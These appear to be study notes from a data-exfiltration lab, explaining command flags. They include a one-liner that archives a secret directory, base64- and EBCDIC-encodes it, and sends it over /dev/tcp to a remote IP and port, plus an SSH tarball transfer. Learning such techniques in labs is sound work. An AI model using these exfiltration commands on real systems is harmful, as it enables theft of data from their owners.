To zip a file 
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080

We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.
The z is for using gzip to compress the selected folder, 
the c is for creating a new archive, 
and the f is for using an archive file.
We then passed the created tar file to the base64 command for converting it to base64 representation.
Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080.


tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"

x: Extracts files from the archive (unpacks the tarball).
p: Preserves the file permissions (ownership, modes, etc.) when extracting.
f: Specifies the archive file to operate on. In this case, - is used to read the archive from standard input.
So, the command tar xpf - means:

Extract the tarball from standard input (-), while preserving permissions.

sudo sed -i 's/ /+/g' /tmp/http.bs64
breaks down as follows:

sudo: Runs the command with superuser (root) privileges.
sed -i: Runs the stream editor sed in-place, modifying the file directly.
's/ /+/g': The sed substitution command:
s: Substitutes the first pattern (a space ) with the second pattern (a plus sign +).
/g: Replaces all occurrences in each line (global replacement).
/tmp/http.bs64: The target file being modified, in this case, /tmp/http.bs64.
What it does:
It replaces all spaces ( ) with plus signs (+) in the file /tmp/http.bs64. This could be useful for URL encoding, where spaces are often replaced with +.
